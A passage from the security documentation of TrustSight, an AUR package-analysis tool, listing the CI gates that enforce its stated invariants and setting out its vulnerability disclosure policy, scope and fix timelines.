**One analysis underneath.** The API is an adapter, not an implementation. It reaches a package through the entry points the CLI uses - `review.analyze_outdated_batch`, `review.discover_packages`, `analysis.analyze_package`, `full_aur.analyze.analyze_package_text` - and derives meaning through `reporting.evaluate_fact`. It computes no score of its own: importing `calculate_score`, `apply_rules` or `risk_level`, or reaching the rule engine, the differ or the tokenizer directly, fails the build. A second pipeline would be free to drift while every behavioural parity check kept passing on whichever surface it happened to exercise.

**And the terminal is a surface.** Comparing JSON with JSON says nothing about what a reviewer actually reads, and a reviewer reads whichever of the four renders their terminal gave them. So a field the body carries may not be dropped by a render: the coverage gap ([B2](#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete)), the suppressed rule ([B5](#b5-suppression-is-always-visible)) and the change summary ([B7](#b7-a-result-reports-what-changed-not-only-what-fired)) are each asserted on all four. Each of those three already had a gate, and each gate was aimed at the layer where the value is *set* rather than at the renders that have to show it - so all three were, in fact, false somewhere: `inspect` reported nothing about a partial read unless a band was requested, `review` carried suppressions only in its JSON body, and `inspect` without Rich had no change summary at all.

The gates are behavioural where the property is about values and structural where it is about reachability, and the body gates run through the surfaces a caller actually reaches rather than through the shared helper: comparing `report_body` with itself would prove only that it equals itself. The render gate loops over all four renderers for the same reason `terminal output is inert` does.

---

## Part C: The enforcement map

Each row is one invariant, the gate that proves it, and where the behaviour lives. Run them all with:

```bash
python scripts/security_gates.py
```

`scripts/security_gates.py` returns exit code 1 when any gate fails (and 0 when all pass), so an exit code of 1 means a claim on this page has stopped being true. That is the same non-zero exit the CI job keys on to fail the build.

| Gate | Invariant | Implementation |
|------|-----------|----------------|
| `no interpreter or shell execution` | A1 | source-wide AST scan |
| `version arguments are shape-checked` | A1 | `discovery._VERSION_ARG_RE` |
| `network confined to the fetch modules` | A2, A3 | `discovery.py`, `fetcher.py`, `full_aur/fetch.py`, `full_aur/metadata.py`, `release.py` |
| `declared source URLs are never fetched` | A2 | no raw transport in `src/trustsight/analysis/`, and every fetch helper it imports is name-keyed |
| `every JSON report carries the fingerprint` | B1 | `schema.fact_to_dict`, `reporting.report_body` |
| `suppression is never hidden by a flag` | B5 | `suppressed_rules` outside any verbosity branch in `cli/review.py` |
| `the default output is not headline-shaped` | Guarantees | the default inspect render volunteers no score |
| `one network host, declared` | A3 | endpoint constants: `aur.archlinux.org` everywhere, `github.com` only in `release.py` |
| `every request has a timeout` | A4 | `urlopen` call sites |
| `every stream read is bounded` | A4, A14 | source-wide AST scan for a `read()` with no size |
| `artifact reads are bounded before verification` | A4 | `db.py`, `ioc_baseline.py`, `seed_build.py`, `full_aur/export.py` |
| `rule matching is bounded on hostile input` | A5 | `rules.MAX_RULE_LINE_BYTES` |
| `differ hostile input is bounded` | A4b | `differ` parser limits and hostile extraction gate |
| `generated diff is bounded before assembly` | A4b, B2 | `differ.generate_diff_bounded`, `MAX_DIFF_PATCHES`, `MAX_PATCH_BYTES` |
| `companion reads are bounded before data` | A4b | `differ.companion_source_hunks`, `MAX_PKG_BUILD_BYTES`, `MAX_COMPANION_TREE_ENTRIES` |
| `differ output is deterministic` | Guarantees | sorted differ summaries and URL extraction |
| `API inputs are bounded before initialization` | A4c | `trustsight.api` input validators |
| `expansion is bounded and never indirect` | A6 | `tokenizer.py` |
| `tokenizer hostile-input smoke is deterministic` | A6, A14 | `tokenizer.py` and fixed hostile-input smoke cases |
| `regex patterns pass adversarial audit` | A5, A14 | configured and source regex patterns |
| `untrusted text is sanitised where it is rendered` | A1, B7 | every CLI render path: `safe_text.clean` rather than the weaker `unicode.strip_ansi`, and values wrapped rather than passed to Rich as bare strings |
| `every live regex is audited` | A5, A14 | every compiled pattern reachable from an imported module, including patterns assembled from parts rather than written as literals |
| `report rendering is data-driven` | A7 | `verdict.py`, `findings.py` |
| `no path-based archive extraction` | A8 | `full_aur/fetch.py`, `db._extract_v2_archive` |
| `SQL is parameterised` | A9 | `db.py` |
| `terminal output is inert` | A10 | `safe_text.py`, `cli/` |
| `freshness uses local marker` | A11 | `fetcher._is_current`, `fetcher.last_fetch_time` |
| `a seed cannot rewrite the database` | A12 | `db.import_seed` |
| `hashed maintainers protect privacy` | P1 | `db.maintainers_hashed`, `seed_meta.salt` |
| `the seed hash is deterministic` | P1 | `seed_build._hash_value` |
| `an IOC match carries its source` | A13b | `ioc_baseline.IocMatch.source`, `analysis/ioc_match.py` |
| `IOC matches never contribute to the score` | B1 | `PackageFact.ioc_matches` separate from `score_breakdown` |
| `an expired IOC is never silent` | IOC expiration | `ioc_baseline.active_iocs`, `cli/ioc.py` `[EXPIRED]` label |
| `IOCs are not in the rule config layer` | config separation | no `ioc` table in `rules.toml`, `patterns.toml`, `thresholds.toml` |
| `reserved names are refused by every writer` | A12, A13 | `db.upsert_package`, `db.save_package_profile`, `db.save_pkgbuild_snapshot` |
| `a baseline supplies state, not rules` | A13 | `full_aur/export.import_baseline` |
| `incomplete coverage fails closed` | B2 | `coverage.fail_closed` |
| `a truncated diff cannot read as unflagged` | B2 | `analysis/pipeline.py`, `full_aur/analyze.py` |
| `an unpinned build dependency is a declared gap` | B2, A14 | `analysis/buildfetch.py`, `coverage.UNPINNED_BUILD_DEPS` |
| `a coverage gap is always shown with the band` | B2 | `coverage.qualified_band`, `scoring.verdict_label` |
| `every result declares its coverage` | B2 | every `PackageFact(...)` construction |
| `a result reports what changed` | B7 | `changes` on every `PackageFact` |
| `change entries carry no severity` | B7 | `changes` is a list of plain strings |
| `content findings carry a location` | B8 | `findings.NON_CONTENT_RULES` |
| `no template grants permission to skip` | B9 | denylist over `verdict.py`, `findings.py` |
| `positive evidence never changes the score` | B10 | every `P` finding is INFO, weight 0 |
| `every render reports the same information` | B11, B2, B5, B7 | all four renderers in `cli/review.py`, `cli/inspect.py` |
| `the API and CLI emit the same JSON body` | B11 | `reporting.report_body`, `REPORT_KEYS` |
| `the score is withheld from every default body` | B11, Guarantees | `reporting.SCORE_KEYS`, `Report.to_dict` |
| `the API and CLI share one analysis` | B11 | `api.py` imports the CLI's analysis entry points |
| `positive evidence cannot lower a FATAL` | B10, B4 | maximal declared evidence plus one FATAL |
| `declared findings fire under the shipped config` | B10 | every `P` finding reachable with the config that ships |
| `a critical finding never reads medium` | B4, bands | `scoring.CRITICAL_BAND_FLOOR`, `calculate_score` |
| `a fatal finding names itself in the label` | B4, bands | `scoring.verdict_label`, `_fatal_label` |
| `the flag threshold is derived, not copied` | B2 | `scoring.FLAG_THRESHOLD` |
| `the maturity numbers are derived, not copied` | B3 | `scoring._MATURITY_THRESHOLD` |
| `FATAL rules cannot be switched off` | B4 | `config.enforce_fatal_rules` |
| `FATAL findings survive every override` | B4, B5 | `override.filter_triggered_rules` |
| `doc cross-references resolve` | this page, and every page linking to it | every `docs/**` link and anchor |
| `the score is deterministic under a fixed fingerprint` | B1 | `config.config_fingerprint`, two-run comparison |
| `every input bound is a source constant` | A14 | bound constants are module-level literals |
| `every result render ends with a direction to review` | B9 | `verdict.DIRECTIONS`, structural |
| `no git filters or hooks are configured` | A3 | clone configuration |
| `docs/security.md matches the gates` | this page | the table above |
| `CI installs from the lock` | the CI assumption | `uv sync --locked` in every workflow, `uv.lock` |
| `critical paths are synchronised` | `CODEOWNERS`, signature workflow and contributor policy | canonical `scripts/critical_paths.py` |
| `an audit does not write history` | A15 | connection opened `mode=ro` when `--record` is absent; behavioural, asserted by running the path against a fixture DB and diffing it |
| `the history walk is bounded` | A14 | `fetcher.walk_bounded` is the only walker; `fetcher.MAX_HISTORY_COMMITS`, `fetcher.MAX_HISTORY_DIFFS` |
| `run diff assembly is bounded` | A14, B2 | `fetcher.MAX_RUN_DIFF_BYTES` charged across results |
| `a truncated history walk is a declared gap` | B2 | `coverage.HISTORY_TRUNCATED` set on every early stop |
| `every history diff is scored independently` | B1 | no aggregate score reachable from the `--last` path |

How each gate is scoped, and the recurring mistake that lets one pass while its invariant is broken, is set out in [reviewing a security control](contributing/security-review.md). Read it before adding an invariant or a gate.

The last row is the one that keeps the rest honest: a gate with no entry here is an unstated guarantee, and an entry with no gate is an unsupported promise. Both fail the build.

Detection calibration is enforced separately by `scripts/calibration_gates.py`; see [fire rates](explanation/fire-rates.md). The taxonomy and the adversarial thread of this model are developed at three depths: [evidence tiers](reference/evidence-tiers.md) describes the signals; [what TrustSight cannot see](explanation/what-trustsight-cannot-see.md) describes the limits; this page describes the whole.

---

## Part D: Vulnerability reporting

### How to report

**Contact:** `emiliano.gandini@protonmail.com`  PGP: `F759D6D49B0A395AB922414A5CC3B4C50D37E793`

Provide steps to reproduce, the affected version (`trustsight --version`), and what an attacker gains. A PKGBUILD or diff that demonstrates the issue is always better than a description.

1. There will be an acknowledgement within 72 hours.
2. Triage follows within 7 days.
3. In-scope issues get fixed on the timeline below.
4. Do not open a public issue before a patch exists.

### Supported versions

Only the latest release is supported. Fixes ship in a new version; there are no backports.

### What counts as a vulnerability in this kind of tool

TrustSight is an evidence tool with published limits, so "it missed something" is usually a rule request, not a vulnerability. The taxonomy above is what separates the two: a defect is a case where the tool moved between taxonomy rows silently, or failed to protect the machine while doing it.

**In scope. Violations of Part A:**

- Code execution, file write, or file read outside the data/cache/config dirs, triggered by analysing a package.
- Any outbound connection to a host other than the two declared endpoints (`aur.archlinux.org`, the release channel), or any fetch of a URL a PKGBUILD declares.
- Terminal escape sequences or markup reaching a terminal from package-controlled text, including a crash of the renderer.
- Unbounded memory or CPU from a crafted package: a decompression bomb, a pathological regex input, a response with no cap.
- SQL injection or any write to the database driven by package-controlled text outside the columns it belongs in.
- A seed or baseline that changes state it is not permitted to change: a rule, a pattern, a severity, a weight, a metadata key it does not own, or a row learned from a real analysis. A validly signed baseline whose contents are simply hostile is not this: that is the documented shape of importing someone else's corpus, and A13 bounds what it can do.

**In scope. Violations of Part B:**

- A construction that causes an analysis to **skip content without a coverage gap being recorded**. Every bound that drops input has a gap; any other way to get content past the analyser silently is a vulnerability.
- A construction that produces an **UNFLAGGED or Low result despite an incomplete analysis**, or that gets an incomplete analysis rendered to a human with an **unqualified band**.
- Suppressing, removing or downgrading a FATAL rule or finding through any supported input.
- Making a finding disappear from the report without it appearing as suppressed.
- Any nondeterminism in the score: the same input, under the same `config_fingerprint` and against the same stored observation history, producing different numbers. A score that differs because the two databases hold different history is [B1](#b1-a-score-is-a-sum-of-matched-evidence-nothing-more) working as described, not a finding.

**Out of scope:** rule evasion; score tuning; false positives; compromised upstream packages (that is the point); anything requiring a local attacker with write access to your config or your database; absence of runtime/sandbox analysis; anything after `makepkg`.

### Timeline

| Severity | Definition | Fix released in |
| --- | --- | --- |
| Critical | Code execution or file write on the reviewer's machine, from analysing a package. | 7 days |
| High | Any other Part A breach, or a verdict-integrity breach under Part B. | 30 days |
| Moderate | A Part A or Part B breach that needs an unlikely precondition. | 90 days |
| Low | Hardening, no demonstrated attack. | Next release |

Reporters are credited in the changelog unless they ask not to be.

---

Back to the panel. The invariants in Part A are what keep the instrument working while the input tries to break it. Part B bounds what a reading is allowed to claim. Part C makes both fail the build the moment they stop being true, which is the only reason the first two paragraphs of this page are worth anything. The decision at the end is yours; the tool's job is to make sure you are making it with the sensors you think you have.

The [evidence tiers](reference/evidence-tiers.md) are the sensor catalogue; [what TrustSight cannot see](explanation/what-trustsight-cannot-see.md) is the list of instruments this aircraft does not carry.
